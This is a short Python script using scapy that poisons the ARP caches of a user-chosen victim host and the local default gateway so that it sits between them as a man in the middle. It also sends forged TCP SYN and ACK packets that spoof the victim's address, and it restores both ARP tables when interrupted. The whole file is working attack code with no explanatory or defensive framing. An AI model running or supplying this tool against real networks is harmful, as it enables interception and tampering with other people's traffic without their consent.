from scapy.all import *
from  time import sleep
import netifaces
import sys

def getMAC(ip):   
	ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3)
	for s, r in ans:
		return r.sprintf('%Ether.src%')

def poisonARP(srcip, targetip, targetmac):
	arp = ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
	send(arp)

def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
	arp1 = ARP(op=2, pdst=victimip, psrc=gatewayip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gatewaymac)
	arp2 = ARP(op=2, pdst=gatewayip, psrc=victimip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victimmac)
	send(arp1, count=3)
	send(arp2, count=3)
	
def main():	
	gws=netifaces.gateways()
	gatewayip = gws['default'][netifaces.AF_INET][0]
	victimip = input("please enter victim IP:")

	victimmac = getMAC(victimip)
	gatewaymac = getMAC(gatewayip)
	
	if victimmac == None or gatewaymac == None:
		print('Could not find MAC Address')
		return
	
	print('+++ ARP Spoofing START -> VICTIM IP[%s]' %victimip)	
	print('[%s]:POISON ARP Table [%s] -> [%s]' %(victimip, gatewaymac, victimmac))	
	try:
		while True:
			p1 = IP(dst = gatewayip, src = victimip)/TCP(dport=80, sport=5000, flags='S')
			sr(p1)
			print ("Okay")

			poisonARP(gatewayip, victimip, victimmac)
			poisonARP(victimip, gatewayip, gatewaymac)
			
			
			seq = sys.stdin.readline()
			
			seq = int(seq[:-1])
			p2 = IP(dst = victimip, src = gatewayip)/TCP(dport=80, sport = 5000, flags='A',ack=seq+1, seq=1)
			sr(p2)
			
			sleep(1)
			
	except KeyboardInterrupt:  
		restoreARP(victimip, gatewayip, victimmac, gatewaymac)
		print('--- ARP Spoofing END -> RESTORED ARP Table')	
	
if __name__ == '__main__':	
	main()
